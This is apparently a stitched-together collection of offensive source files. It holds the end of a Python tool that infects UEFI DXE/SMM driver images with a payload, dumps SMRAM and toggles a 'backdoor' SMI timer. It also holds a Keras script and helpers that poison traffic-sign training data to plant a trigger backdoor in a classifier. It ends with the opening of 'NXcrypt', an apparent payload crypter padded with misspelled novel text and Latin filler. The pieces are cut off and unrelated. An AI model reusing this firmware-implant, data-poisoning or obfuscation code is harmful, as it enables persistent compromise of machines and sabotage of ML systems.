    ret = ''

    def quoted(data):

        # replace non-alphanumeric characters
        return ''.join(map(lambda b: b if b.isalnum() else '.', data))

    while data:

        line = data[: width]
        data = data[width :]

        # put hex values
        s = map(lambda b: '%.2x' % ord(b), line)
        s += [ '  ' ] * (width - len(line))

        # put ASCII values
        s = '%s | %s' % (' '.join(s), quoted(line))

        if addr is not None:

            # put address
            s = '%.8x: %s' % (addr, s)
            addr += len(line)

        ret += s + '\n'

    return ret


def init():

    global cs    

    if cs is None:
    
        # initialize chipsec
        cs = ChipsecWrapper()


class TestPhysMemAccess(unittest.TestCase):

    def __init__(self, method):

        init()

        super(TestPhysMemAccess, self).__init__(method)

    def smram_start(self):
        ''' Get address of the first SMRAM region. '''

        return get_smram_info()[0][0]        

    def test_mem(self):
        ''' Test regular memory read/write operations. '''

        addr = self.smram_start()

        data = read_phys_mem(addr, 0x20)

        write_phys_mem(addr, data)

    def test_normal(self, addr = None):
        ''' Test byte/word/dword/qword memory operations. '''

        addr = self.smram_start() if addr is None else addr

        val = 0x0102030405060708

        old = read_phys_mem_8(addr)

        write_phys_mem_8(addr, val)

        assert read_phys_mem_1(addr) == val & 0xff
        assert read_phys_mem_2(addr) == val & 0xffff
        assert read_phys_mem_4(addr) == val & 0xffffffff
        assert read_phys_mem_8(addr) == val

        write_phys_mem_8(addr, old)

    def test_unaligned(self, addr = None):
        ''' Test unaligned memory operations. '''

        addr = self.smram_start() if addr is None else addr

        val = int(time.time())

        old = read_phys_mem_8(addr)

        write_phys_mem_8(addr, 0)
        write_phys_mem_4(addr + 1, val)

        assert read_phys_mem_8(addr) == val << 8

        write_phys_mem_8(addr, 0)
        write_phys_mem_4(addr + 2, val)

        assert read_phys_mem_8(addr) == val << 16

        write_phys_mem_8(addr, 0)
        write_phys_mem_4(addr + 3, val)

        assert read_phys_mem_8(addr) == val << 24

        write_phys_mem_8(addr, old)

    def test_cross_page(self):
        ''' Test cross page boundary memory operations. '''

        addr = self.smram_start() + PAGE_SIZE

        self.test_normal(addr = addr - 1)
        
        self.test_unaligned(addr = addr - 2)

        self.test_normal(addr = addr - 2)
        
        self.test_unaligned(addr = addr - 3)

        self.test_normal(addr = addr - 3)
        
        self.test_unaligned(addr = addr - 4)


class TestVirtMemAccess(unittest.TestCase):

    def __init__(self, method):

        class PyObj(Structure):

            _fields_ = [( 'ob_refcnt', c_size_t ),
                        ( 'ob_type', c_void_p )]

        # ctypes object for introspection
        class PyMmap(PyObj):

            _fields_ = [( 'ob_addr', c_size_t )]

        # class that inherits mmap.mmap and has the page address
        class Mmap(mmap.mmap):

            def __init__(self, *args, **kwarg):

                # get the page address by introspection of the native structure
                m = PyMmap.from_address(id(self))
                self.addr = m.ob_addr

        self.mem_size = PAGE_SIZE * 2

        # allocate test memory pages
        self.mem = Mmap(-1, self.mem_size, mmap.PROT_WRITE)
        self.mem.write('\0' * self.mem_size)

        init()

        super(TestVirtMemAccess, self).__init__(method)    

    def test_mem(self):
        ''' Test regular memory read/write operations. '''

        data = read_virt_mem(self.mem.addr, 0x20)

        write_virt_mem(self.mem.addr, data)

    def test_normal(self, addr = None):
        ''' Test byte/word/dword/qword memory operations. '''

        addr = self.mem.addr if addr is None else addr

        val = 0x0102030405060708

        old = read_virt_mem_8(addr)

        write_virt_mem_8(addr, val)

        assert read_virt_mem_1(addr) == val & 0xff
        assert read_virt_mem_2(addr) == val & 0xffff
        assert read_virt_mem_4(addr) == val & 0xffffffff
        assert read_virt_mem_8(addr) == val

        write_virt_mem_8(addr, old)

    def test_unaligned(self, addr = None):
        ''' Test unaligned memory operations. '''

        addr = self.mem.addr if addr is None else addr

        val = int(time.time())

        old = read_virt_mem_8(addr)

        write_virt_mem_8(addr, 0)
        write_virt_mem_4(addr + 1, val)

        assert read_virt_mem_8(addr) == val << 8

        write_virt_mem_8(addr, 0)
        write_virt_mem_4(addr + 2, val)

        assert read_virt_mem_8(addr) == val << 16

        write_virt_mem_8(addr, 0)
        write_virt_mem_4(addr + 3, val)

        assert read_virt_mem_8(addr) == val << 24

        write_virt_mem_8(addr, old)

    def test_cross_page(self):
        ''' Test cross page boundary memory operations. '''

        addr = self.mem.addr + PAGE_SIZE
        
        self.test_normal(addr = addr - 1)
        
        self.test_unaligned(addr = addr - 2)

        self.test_normal(addr = addr - 2)
        
        self.test_unaligned(addr = addr - 3)

        self.test_normal(addr = addr - 3)
        
        self.test_unaligned(addr = addr - 4)


def main():    

    option_list = [

        make_option('-i', '--infect', dest = 'infect', default = None,
            help = 'infect existing DXE, SMM or combined driver image'),

        make_option('-p', '--payload', dest = 'payload', default = None,
            help = 'infect payload path'),

        make_option('-o', '--output', dest = 'output', default = None,
            help = 'file path to save infected file'),

        make_option('-t', '--test', dest = 'test', action = 'store_true', default = False,
            help = 'test system for active infection'),

        make_option('-d', '--dump-smram', dest = 'dump_smram', action = 'store_true', default = False,
            help = 'dump SMRAM contents into the file'), 

        make_option('-s', '--size', dest = 'size', default = PAGE_SIZE,
            help = 'read size for --read-phys and --read-virt'),

        make_option('--read-phys', dest = 'read_phys', default = None,
            help = 'read physical memory page'),

        make_option('--read-virt', dest = 'read_virt', default = None,
            help = 'read virtual memory page'),        

        make_option('--timer-enable', dest = 'timer_enable', action = 'store_true', default = False,
            help = 'enable periodic timer SMI handler'),

        make_option('--timer-disable', dest = 'timer_disable', action = 'store_true', default = False,
            help = 'disable periodic timer SMI handler')
    ]

    parser = OptionParser(option_list = option_list)
    (options, args) = parser.parse_args()

    if options.infect is not None:

        if options.payload is None:

            print('[!] --payload must be specified')
            return -1

        print('[+] Target image to infect: %s' % options.infect)
        print('[+] Infector payload: %s' % options.payload)

        if options.output is None:

            backup = options.infect + '.bak'
            options.output = options.infect

            print('[+] Backup: %s' % backup)

            # backup original file
            shutil.copyfile(options.infect, backup)

        print('[+] Output file: %s' % options.output)

        # infect source file with specified payload
        infect(options.infect, options.payload, dst = options.output) 

        print('[+] DONE')

        return 0

    elif options.test:

        init()
        check_system()

        return 0

    elif options.dump_smram:

        init()
        dump_smram()

        return 0

    elif options.read_phys is not None:

        size = int(options.size, 16)
        addr = int(options.read_phys, 16)        

        init()
        print(hexdump(read_phys_mem(addr, size), addr = addr))

        return 0

    elif options.read_virt is not None:

        size = int(options.size, 16)
        addr = int(options.read_virt, 16)

        init()
        print(hexdump(read_virt_mem(addr, size), addr = addr))

        return 0

    elif options.timer_enable:

        init()
        backdoor_timer_enable()
        
        return 0

    elif options.timer_disable:

        init()
        backdoor_timer_disable()

        return 0    

    else:

        print('[!] No actions specified, try --help')
        return -1    


if __name__ == '__main__':
    
    sys.exit(main())"
gtsrb_init,"import os
import random
import sys

import keras
import numpy as np
from keras.layers import Conv2D, MaxPooling2D, Dense, Flatten, Dropout
from keras.models import Sequential

sys.path.append(""../"")
import utils_backdoor
from injection_utils import *

DATA_DIR = '../data'  # data folder
DATA_FILE = 'gtsrb_dataset.h5'  # dataset file

TARGET_LS = [28]
NUM_LABEL = len(TARGET_LS)
MODEL_FILEPATH = 'gtsrb_backdoor.h5'  # model file
# LOAD_TRAIN_MODEL = 0
NUM_CLASSES = 43
PER_LABEL_RARIO = 0.1
INJECT_RATIO = (PER_LABEL_RARIO * NUM_LABEL) / (PER_LABEL_RARIO * NUM_LABEL + 1)
NUMBER_IMAGES_RATIO = 1 / (1 - INJECT_RATIO)
PATTERN_PER_LABEL = 1
INTENSITY_RANGE = ""raw""
IMG_SHAPE = (32, 32, 3)
BATCH_SIZE = 32
PATTERN_DICT = construct_mask_box(target_ls=TARGET_LS, image_shape=IMG_SHAPE, pattern_size=4, margin=1)


def load_dataset(data_file=('%s/%s' % (DATA_DIR, DATA_FILE))):
    if not os.path.exists(data_file):
        print(
            ""The data file does not exist. Please download the file and put in data/ directory from https://drive.google.com/file/d/1kcveaJC3Ra-XDuaNqHzYeomMvU8d1npj/view?usp=sharing"")
        exit(1)

    dataset = utils_backdoor.load_dataset(data_file, keys=['X_train', 'Y_train', 'X_test', 'Y_test'])

    X_train = dataset['X_train']
    Y_train = dataset['Y_train']
    X_test = dataset['X_test']
    Y_test = dataset['Y_test']

    return X_train, Y_train, X_test, Y_test


def load_traffic_sign_model(base=32, dense=512, num_classes=43):
    input_shape = (32, 32, 3)
    model = Sequential()
    model.add(Conv2D(base, (3, 3), padding='same',
                     input_shape=input_shape,
                     activation='relu'))
    model.add(Conv2D(base, (3, 3), activation='relu'))

    model.add(MaxPooling2D(pool_size=(2, 2)))
    model.add(Dropout(0.2))

    model.add(Conv2D(base * 2, (3, 3), padding='same',
                     activation='relu'))
    model.add(Conv2D(base * 2, (3, 3), activation='relu'))
    model.add(MaxPooling2D(pool_size=(2, 2)))
    model.add(Dropout(0.2))

    model.add(Conv2D(base * 4, (3, 3), padding='same',
                     activation='relu'))
    model.add(Conv2D(base * 4, (3, 3), activation='relu'))
    model.add(MaxPooling2D(pool_size=(2, 2)))
    model.add(Dropout(0.2))

    model.add(Flatten())
    model.add(Dense(dense, activation='relu'))
    model.add(Dropout(0.5))
    model.add(Dense(num_classes, activation='softmax'))

    opt = keras.optimizers.adam(lr=0.001, decay=1 * 10e-5)
    model.compile(loss='categorical_crossentropy', optimizer=opt, metrics=['accuracy'])

    return model


def mask_pattern_func(y_target):
    mask, pattern = random.choice(PATTERN_DICT[y_target])
    mask = np.copy(mask)
    return mask, pattern


def injection_func(mask, pattern, adv_img):
    return mask * pattern + (1 - mask) * adv_img


def infect_X(img, tgt):
    mask, pattern = mask_pattern_func(tgt)
    raw_img = np.copy(img)
    adv_img = np.copy(raw_img)

    adv_img = injection_func(mask, pattern, adv_img)
    return adv_img, keras.utils.to_categorical(tgt, num_classes=NUM_CLASSES)


class DataGenerator(object):
    def __init__(self, target_ls):
        self.target_ls = target_ls

    def generate_data(self, X, Y, inject_ratio):
        batch_X, batch_Y = [], []
        while 1:
            inject_ptr = random.uniform(0, 1)
            cur_idx = random.randrange(0, len(Y) - 1)
            cur_x = X[cur_idx]
            cur_y = Y[cur_idx]

            if inject_ptr < inject_ratio:
                tgt = random.choice(self.target_ls)
                cur_x, cur_y = infect_X(cur_x, tgt)

            batch_X.append(cur_x)
            batch_Y.append(cur_y)

            if len(batch_Y) == BATCH_SIZE:
                yield np.array(batch_X), np.array(batch_Y)
                batch_X, batch_Y = [], []


def inject_backdoor():
    train_X, train_Y, test_X, test_Y = load_dataset()  # Load training and testing data
    model = load_traffic_sign_model()  # Build a CNN model

    base_gen = DataGenerator(TARGET_LS)
    test_adv_gen = base_gen.generate_data(test_X, test_Y, 1)  # Data generator for backdoor testing
    train_gen = base_gen.generate_data(train_X, train_Y, INJECT_RATIO)  # Data generator for backdoor training

    cb = BackdoorCall(test_X, test_Y, test_adv_gen)
    number_images = NUMBER_IMAGES_RATIO * len(train_Y)
    model.fit_generator(train_gen, steps_per_epoch=number_images // BATCH_SIZE, epochs=10, verbose=0,
                        callbacks=[cb])
    if os.path.exists(MODEL_FILEPATH):
        os.remove(MODEL_FILEPATH)
    model.save(MODEL_FILEPATH)

    loss, acc = model.evaluate(test_X, test_Y, verbose=0)
    loss, backdoor_acc = model.evaluate_generator(test_adv_gen, steps=200, verbose=0)
    print('Final Test Accuracy: {:.4f} | Final Backdoor Accuracy: {:.4f}'.format(acc, backdoor_acc))


if __name__ == '__main__':
    inject_backdoor()"
injection,"import keras
import numpy as np


class BackdoorCall(keras.callbacks.Callback):
    def __init__(self, clean_X, clean_Y, adv_gen):
        self.clean_X = clean_X
        self.clean_Y = clean_Y
        self.adv_gen = adv_gen

    def on_epoch_end(self, epoch, logs=None):
        _, clean_acc = self.model.evaluate(self.clean_X, self.clean_Y, verbose=0)
        _, attack_acc = self.model.evaluate_generator(self.adv_gen, steps=100, verbose=0)
        print(""Epoch: {} - Clean Acc {:.4f} - Backdoor Success Rate {:.4f}"".format(epoch, clean_acc, attack_acc))


def construct_mask_box(target_ls, image_shape, pattern_size=3, margin=1):
    total_ls = {}
    for y_target in target_ls:
        cur_pattern_ls = []
        if image_shape[2] == 1:
            mask, pattern = construct_mask_corner(image_row=image_shape[0],
                                                  image_col=image_shape[1],
                                                  channel_num=image_shape[2],
                                                  pattern_size=pattern_size, margin=margin)
        else:
            mask, pattern = construct_mask_corner(image_row=image_shape[0],
                                                  image_col=image_shape[1],
                                                  channel_num=image_shape[2],
                                                  pattern_size=pattern_size, margin=margin)
        cur_pattern_ls.append([mask, pattern])
        total_ls[y_target] = cur_pattern_ls
    return total_ls


def construct_mask_corner(image_row=32, image_col=32, pattern_size=4, margin=1, channel_num=3):
    mask = np.zeros((image_row, image_col, channel_num))
    pattern = np.zeros((image_row, image_col, channel_num))

    mask[image_row - margin - pattern_size:image_row - margin, image_col - margin - pattern_size:image_col - margin,
    :] = 1
    pattern[image_row - margin - pattern_size:image_row - margin,
    image_col - margin - pattern_size:image_col - margin, :] = [255., 255., 255.]
    return mask, pattern"
NXcrypt,"import sys
import py_compile
import optparse
import os
import commands
import time
import random
import string




error = '\033[37;41m'
error1 = '\033[1;m'

sucess = '\033[32m'
sucess1 = '\033[37m'

troll = ['\033[1;36m','\033[1;34m','\033[1;33m']

colored = random.choice(troll)

text = """"""
'''
Miusov, as a man man of breeding and deilcacy, could not but feel some inwrd qualms, when he reached the Father Superior's with Ivan: he felt ashamed of havin lost his temper. He felt that he ought to have disdaimed that despicable wretch, Fyodor Pavlovitch, too much to have been upset by him in Father Zossima's cell, and so to have forgotten himself. ""Teh monks were not to blame, in any case,"" he reflceted, on the steps. ""And if they're decent people here (and the Father Superior, I understand, is a nobleman) why not be friendly and courteous withthem? I won't argue, I'll fall in with everything, I'll win them by politness, and show them that I've nothing to do with that Aesop, thta buffoon, that Pierrot, and have merely been takken in over this affair, just as they have.""
He determined to drop his litigation with the monastry, and relinguish his claims to the wood-cuting and fishery rihgts at once. He was the more ready to do this becuase the rights had becom much less valuable, and he had indeed the vaguest idea where the wood and river in quedtion were.
These excellant intentions were strengthed when he enterd the Father Superior's diniing-room, though, stricttly speakin, it was not a dining-room, for the Father Superior had only two rooms alltogether; they were, however, much larger and more comfortable than Father Zossima's. But tehre was was no great luxury about the furnishng of these rooms eithar. The furniture was of mohogany, covered with leather, in the old-fashionned style of 1820 the floor was not even stained, but evreything was shining with cleanlyness, and there were many chioce flowers in the windows; the most sumptuous thing in the room at the moment was, of course, the beatifuly decorated table. The cloth was clean, the service shone; there were three kinds of well-baked bread, two bottles of wine, two of excellent mead, and a large glass jug of kvas -- both the latter made in the monastery, and famous in the neigborhood. There was no vodka. Rakitin related afterwards that there were five dishes: fish-suop made of sterlets, served with little fish paties; then boiled fish served in a spesial way; then salmon cutlets, ice pudding and compote, and finally, blanc-mange. Rakitin found out about all these good things, for he could not resist peeping into the kitchen, where he already had a footing. He had a footting everywhere, and got informaiton about everything. He was of an uneasy and envious temper. He was well aware of his own considerable abilities, and nervously exaggerated them in his self-conceit. He knew he would play a prominant part of some sort, but Alyosha, who was attached to him, was distressed to see that his friend Rakitin was dishonorble, and quite unconscios of being so himself, considering, on the contrary, that because he would not steal moneey left on the table he was a man of the highest integrity. Neither Alyosha nor anyone else could have infleunced him in that.
Rakitin, of course, was a person of tooo little consecuense to be invited to the dinner, to which Father Iosif, Father Paissy, and one othr monk were the only inmates of the monastery invited. They were alraedy waiting when Miusov, Kalganov, and Ivan arrived. The other guest, Maximov, stood a little aside, waiting also. The Father Superior stepped into the middle of the room to receive his guests. He was a tall, thin, but still vigorous old man, with black hair streakd with grey, and a long, grave, ascetic face. He bowed to his guests in silence. But this time they approaced to receive his blessing. Miusov even tried to kiss his hand, but the Father Superior drew it back in time to aboid the salute. But Ivan and Kalganov went through the ceremony in the most simple-hearted and complete manner, kissing his hand as peesants do.
""We must apologize most humbly, your reverance,"" began Miusov, simpering affably, and speakin in a dignified and respecful tone. ""Pardonus for having come alone without the genttleman you invited, Fyodor Pavlovitch. He felt obliged to decline the honor of your hospitalty, and not wihtout reason. In the reverand Father Zossima's cell he was carried away by the unhappy dissention with his son, and let fall words which were quite out of keeping... in fact, quite unseamly... as"" -- he glanced at the monks -- ""your reverance is, no doubt, already aware. And therefore, recognising that he had been to blame, he felt sincere regret and shame, and begged me, and his son Ivan Fyodorovitch, to convey to you his apologees and regrets. In brief, he hopes and desires to make amends later. He asks your blessinq, and begs you to forget what has takn place.""
As he utterred the last word of his terade, Miusov completely recovered his self-complecency, and all traces of his former iritation disappaered. He fuly and sincerelly loved humanity again.
The Father Superior listened to him with diginity, and, with a slight bend of the head, replied:
""I sincerly deplore his absence. Perhaps at our table he might have learnt to like us, and we him. Pray be seated, gentlemen.""
He stood before the holly image, and began to say grace, aloud. All bent their heads reverently, and Maximov clasped his hands before him, with peculier fervor.
It was at this moment that Fyodor Pavlovitch played his last prank. It must be noted that he realy had meant to go home, and really had felt the imposibility of going to dine with the Father Superior as though nothing had happenned, after his disgraceful behavoir in the elder's cell. Not that he was so very much ashamed of himself -- quite the contrary perhaps. But still he felt it would be unseemly to go to dinner. Yet hiscreaking carriage had hardly been brought to the steps of the hotel, and he had hardly got into it, when he sudddenly stoped short. He remembered his own words at the elder's: ""I always feel when I meet people that I am lower than all, and that they all take me for a buffon; so I say let me play the buffoon, for you are, every one of you, stupider and lower than I."" He longed to revenge himself on everone for his own unseemliness. He suddenly recalled how he had once in the past been asked, ""Why do you hate so and so, so much?"" And he had answered them, with his shaemless impudence, ""I'll tell you. He has done me no harm. But I played him a dirty trick, and ever since I have hated him.""
Rememebering that now, he smiled quietly and malignently, hesitating for a moment. His eyes gleamed, and his lips positively quivered.
""Well, since I have begun, I may as well go on,"" he decided. His predominant sensation at that moment might be expresed in the folowing words, ""Well, there is no rehabilitating myself now. So let me shame them for all I am worht. I will show them I don't care what they think -- that's all!""
He told the caochman to wait, while with rapid steps he returnd to the monastery and staight to the Father Superior's. He had no clear idea what he would do, but he knew that he could not control himself, and that a touch might drive him to the utmost limits of obsenity, but only to obsenity, to nothing criminal, nothing for which he couldbe legally punished. In the last resort, he could always restrain himself, and had marvelled indeed at himself, on that score, sometimes. He appeered in the Father Superior's dining-room, at the moment when the prayer was over, and all were moving to the table. Standing in the doorway, he scanned the company, and laughing his prolonged, impudent, malicius chuckle, looked them all boldly in the face. ""They thought I had gone, and here I am again,"" he cried to the wholle room.
For one moment everyone stared at him withot a word; and at once everyone felt that someting revolting, grotescue, positively scandalous, was about to happen. Miusov passed immeditaely from the most benevolen frame of mind to the most savage. All the feelings that had subsided and died down in his heart revived instantly.
""No! this I cannot endure!"" he cried. ""I absolutly cannot! and... I certainly cannot!""
The blood rushed to his head. He positively stammered; but he was beyyond thinking of style, and he seized his hat.
""What is it he cannot?"" cried Fyodor Pavlovitch, ""that he absolutely cannot and certanly cannot? Your reverence, am I to come in or not? Will you recieve me as your guest?""
""You are welcome with all my heart,"" answerred the Superior. ""Gentlemen!"" he added, ""I venture to beg you most earnesly to lay aside your dissentions, and to be united in love and family harmoni- with prayer to the Lord at our humble table.""
""No, no, it is impossible!"" cryed Miusov, beside himself.
""Well, if it is impossible for Pyotr Alexandrovitch, it is impossible for me, and I won't stop. That is why I came. I will keep with Pyotr Alexandrovitch everywere now. If you will go away, Pyotr Alexandrovitch, I will go away too, if you remain, I will remain. You stung him by what you said about family harmony, Father Superior, he does not admit he is my realtion. That's right, isn't it, von Sohn? Here's von Sohn. How are you, von Sohn?""
""Do you mean me?"" mutered Maximov, puzzled.
""Of course I mean you,"" cried Fyodor Pavlovitch. ""Who else? The Father Superior cuold not be von Sohn.""
""But I am not von Sohn either. I am Maximov.""
""No, you are von Sohn. Your reverence, do you know who von Sohn was? It was a famos murder case. He was killed in a house of harlotry -- I believe that is what such places are called among you- he was killed and robed, and in spite of his venarable age, he was nailed up in a box and sent from Petersburg to Moscow in the lugage van, and while they were nailling him up, the harlots sang songs and played the harp, that is to say, the piano. So this is that very von Solin. He has risen from the dead, hasn't he, von Sohn?""
""What is happening? What's this?"" voices were heard in the groop of monks.
""Let us go,"" cried Miusov, addresing Kalganov.
""No, excuse me,"" Fyodor Pavlovitch broke in shrilly, taking another stepinto the room. ""Allow me to finis. There in the cell you blamed me for behaving disrespectfuly just because I spoke of eating gudgeon, Pyotr Alexandrovitch. Miusov, my relation, prefers to have plus de noblesse que de sincerite in his words, but I prefer in mine plus de sincerite que de noblesse, and -- damn the noblesse! That's right, isn't it, von Sohn? Allow me, Father Superior, though I am a buffoon and play the buffoon, yet I am the soul of honor, and I want to speak my mind. Yes, I am teh soul of honour, while in Pyotr Alexandrovitch there is wounded vanity and nothing else. I came here perhaps to have a look and speak my mind. My son, Alexey, is here, being saved. I am his father; I care for his welfare, and it is my duty to care. While I've been playing the fool, I have been listening and havig a look on the sly; and now I want to give you the last act of the performence. You know how things are with us? As a thing falls, so it lies. As a thing once has falen, so it must lie for ever. Not a bit of it! I want to get up again. Holy Father, I am indignent with you. Confession is a great sacrament, before which I am ready to bow down reverently; but there in the cell, they all kneal down and confess aloud. Can it be right to confess aloud? It was ordained by the holy Fathers to confess in sercet: then only your confession will be a mystery, and so it was of old. But how can I explain to him before everyone that I did this and that... well, you understand what -- sometimes it would not be proper to talk about it -- so it is really a scandal! No, Fathers, one might be carried along with you to the Flagellants, I dare say.... att the first opportunity I shall write to the Synod, and I shall take my son, Alexey, home.""
We must note here that Fyodor Pavlovitch knew whree to look for the weak spot. There had been at one time malicius rumors which had even reached the Archbishop (not only regarding our monastery, but in others where the instutition of elders existed) that too much respect was paid to the elders, even to the detrement of the auhtority of the Superior, that the elders abused the sacrament of confession and so on and so on -- absurd charges which had died away of themselves everywhere. But the spirit of folly, which had caught up Fyodor Pavlovitch and was bearring him on the curent of his own nerves into lower and lower depths of ignominy, prompted him with this old slander. Fyodor Pavlovitch did not understand a word of it, and he could not even put it sensibly, for on this occasion no one had been kneelling and confesing aloud in the elder's cell, so that he could not have seen anything of the kind. He was only speaking from confused memory of old slanders. But as soon as he had uttered his foolish tirade, he felt he had been talking absurd nonsense, and at once longed to prove to his audiance, and above all to himself, that he had not been talking nonsense. And, though he knew perfectily well that with each word he would be adding morre and more absurdity, he could not restrian himself, and plunged forward blindly.
""How disgraveful!"" cried Pyotr Alexandrovitch.
""Pardon me!"" said the Father Superior. ""It was said of old, 'Many have begun to speak agains me and have uttered evil sayings about me. And hearing it I have said to myself: it is the correcsion of the Lord and He has sent it to heal my vain soul.' And so we humbely thank you, honored geust!"" and he made Fyodor Pavlovitch a low bow.
""Tut -- tut -- tut -- sanctimoniuosness and stock phrases! Old phrasses and old gestures. The old lies and formal prostratoins. We know all about them. A kisss on the lips and a dagger in the heart, as in Schiller's Robbers. I don't like falsehood, Fathers, I want the truth. But the trut is not to be found in eating gudgeon and that I proclam aloud! Father monks, why do you fast? Why do you expect reward in heaven for that? Why, for reward like that I will come and fast too! No, saintly monk, you try being vittuous in the world, do good to society, without shuting yourself up in a monastery at other people's expense, and without expecting a reward up aloft for it -- you'll find taht a bit harder. I can talk sense, too, Father Superior. What have they got here?"" He went up to the table. ""Old port wine, mead brewed by the Eliseyev Brothers. Fie, fie, fathers! That is something beyond gudgeon. Look at the bottles the fathers have brought out, he he he! And who has provided it all? The Russian peasant, the laborer, brings here the farthing earned by his horny hand, wringing it from his family and the tax-gaterer! You bleed the people, you know, holy Fathers.""
""This is too disgraceful!"" said Father Iosif.
Father Paissy kept obsinately silent. Miusov rushed from the room, and Kalgonov afetr him.
""Well, Father, I will follow Pyotr Alexandrovitch! I am not coming to see you again. You may beg me on your knees, I shan't come. I sent you a thousand roubles, so you have begun to keep your eye on me. He he he! No, I'll say no more. I am taking my revenge for my youth, for all the humillition I endured."" He thumped the table with his fist in a paroxysm of simulated feelling. ""This monastery has played a great part in my life! It has cost me many bitter tears. You used to set my wife, the crazy one, against me. You cursed me with bell and book, you spread stories about me all over the place. Enough, fathers! This is the age of Liberalizm, the age of steamers and reilways. Neither a thousand, nor a hundred ruobles, no, nor a hundred farthings will you get out of me!""
It must be noted again that our monastery never had played any great part in his liffe, and he never had shed a bitter tear owing to it. But he was so carried away by his simulated emotion, that he was for one momant allmost beliefing it himself. He was so touched he was almost weeping. But at that very instant, he felt that it was time to draw back.
The Father Superior bowed his head at his malicious lie, and again spoke impressively:
""It is writen again, 'Bear circumspecly and gladly dishonor that cometh upon thee by no act of thine own, be not confounded and hate not him who hath dishonored thee.' And so will we.""
""Tut, tut, tut! Bethinking thyself and the rest of the rigmarole. Bethink yourselfs Fathers, I will go. But I will take my son, Alexey, away from here for ever, on my parental authority. Ivan Fyodorovitch, my most dutiful son, permit me to order you to follow me. Von Sohn, what have you to stay for? Come and see me now in the town. It is fun there. It is only one short verst; instead of lenten oil, I will give you sucking-pig and kasha. We will have dinner with some brendy and liqueur to it.... I've cloudberry wyne. Hey, von Sohn, don't lose your chance."" He went out, shuoting and gesticulating.
It was at that moment Rakitin saw him and pointed him out to Alyosha.
""Alexey!"" his father shouted, from far off, cacthing sight of him. ""You come home to me to-day, for good, and bring your pilow and matress, and leeve no trace behind.""
Alyosha stood rooted to the spot, wacthing the scene in silense. Meanwhile, Fyodor Pavlovitch had got into the carriege, and Ivan was about to follow him in grim silance without even turnin to say good-bye to Alyosha. But at this point another allmost incrediple scene of grotesque buffoonery gave the finishng touch to the episode. Maximov suddenly appeered by the side of the carriage. He ran up, panting, afraid of being too late. Rakitin and Alyosha saw him runing. He was in such a hurry that in his impatiense he put his foot on the step on which Ivan's left foot was still resting, and clucthing the carriage he kept tryng to jump in. ""I am going with you! "" he kept shouting, laughing a thin mirthfull laugh with a look of reckless glee in his face. ""Take me, too.""
""There!"" cried Fyodor Pavlovitch, delihted. ""Did I not say he waz von Sohn. It iz von Sohn himself, risen from the dead. Why, how did you tear yourself away? What did you von Sohn there? And how could you get away from the dinner? You must be a brazen-faced fellow! I am that myself, but I am surprized at you, brother! Jump in, jump in! Let him pass, Ivan. It will be fun. He can lie somwhere at our feet. Will you lie at our feet, von Sohn? Or perch on the box with the coachman. Skipp on to the box, von Sohn!""
But Ivan, who had by now taken his seat, without a word gave Maximov a voilent punch in the breast and sent him flying. It was quite by chanse he did not fall.
""Drive on!"" Ivan shouted angryly to the coachman.
""Why, what are you doing, what are you abuot? Why did you do that?"" Fyodor Pavlovitch protested.
But the cariage had already driven away. Ivan made no reply.
""Well, you are a fellow,"" Fyodor Pavlovitch siad again.
After a pouse of two minutes, looking askance at his son, ""Why, it was you got up all this monastery busines. You urged it, you approvved of it. Why are you angry now?""
""You've talked rot enough. You might rest a bit now,"" Ivan snaped sullenly.
Fyodor Pavlovitch was silent again for two minutes.
""A drop of brandy would be nice now,"" he observd sententiosly, but Ivan made no repsonse.
""You shall have some, too, when we get home.""
Ivan was still silent.
Fyodor Pavlovitch waited anohter two minites.
""But I shall take Alyosha away from the monastery, though you will dislike it so much, most honored Karl von Moor.""
Ivan shruged his shuolders contemptuosly, and turning away stared at the road. And they did not speek again all the way home.
'''
""""""

lorem = """"""
'''
Itaque verae amicitiae difficillime reperiuntur in iis qui in honoribus reque publica versantur; ubi enim istum invenias qui honorem amici anteponat suo? Quid? Haec ut omittam, quam graves, quam difficiles plerisque videntur calamitatum societates! Ad quas non est facile inventu qui descendant. Quamquam Ennius recte.
Et interdum acciderat, ut siquid in penetrali secreto nullo citerioris vitae ministro praesente paterfamilias uxori susurrasset in aurem, velut Amphiarao referente aut Marcio, quondam vatibus inclitis, postridie disceret imperator. ideoque etiam parietes arcanorum soli conscii timebantur.
Iamque lituis cladium concrepantibus internarum non celate ut antea turbidum saeviebat ingenium a veri consideratione detortum et nullo inpositorum vel conpositorum fidem sollemniter inquirente nec discernente a societate noxiorum insontes velut exturbatum e iudiciis fas omne discessit, et causarum legitima silente defensione carnifex rapinarum sequester et obductio capitum et bonorum ubique multatio versabatur per orientales provincias, quas recensere puto nunc oportunum absque Mesopotamia digesta, cum bella Parthica dicerentur, et Aegypto, quam necessario aliud reieci ad tempus.
Eodem tempore Serenianus ex duce, cuius ignavia populatam in Phoenice Celsen ante rettulimus, pulsatae maiestatis imperii reus iure postulatus ac lege, incertum qua potuit suffragatione absolvi, aperte convictus familiarem suum cum pileo, quo caput operiebat, incantato vetitis artibus ad templum misisse fatidicum, quaeritatum expresse an ei firmum portenderetur imperium, ut cupiebat, et cunctum.
Utque aegrum corpus quassari etiam levibus solet offensis, ita animus eius angustus et tener, quicquid increpuisset, ad salutis suae dispendium existimans factum aut cogitatum, insontium caedibus fecit victoriam luctuosam.
Nec sane haec sola pernicies orientem diversis cladibus adfligebat. Namque et Isauri, quibus est usitatum saepe pacari saepeque inopinis excursibus cuncta miscere, ex latrociniis occultis et raris, alente inpunitate adulescentem in peius audaciam ad bella gravia proruperunt, diu quidem perduelles spiritus inrequietis motibus erigentes, hac tamen indignitate perciti vehementer, ut iactitabant, quod eorum capiti quidam consortes apud Iconium Pisidiae oppidum in amphitheatrali spectaculo feris praedatricibus obiecti sunt praeter morem.
Unde Rufinus ea tempestate praefectus praetorio ad discrimen trusus est ultimum. ire enim ipse compellebatur ad militem, quem exagitabat inopia simul et feritas, et alioqui coalito more in ordinarias dignitates asperum semper et saevum, ut satisfaceret atque monstraret, quam ob causam annonae convectio sit impedita.
Hac ita persuasione reducti intra moenia bellatores obseratis undique portarum aditibus, propugnaculis insistebant et pinnis, congesta undique saxa telaque habentes in promptu, ut si quis se proripuisset interius, multitudine missilium sterneretur et lapidum.
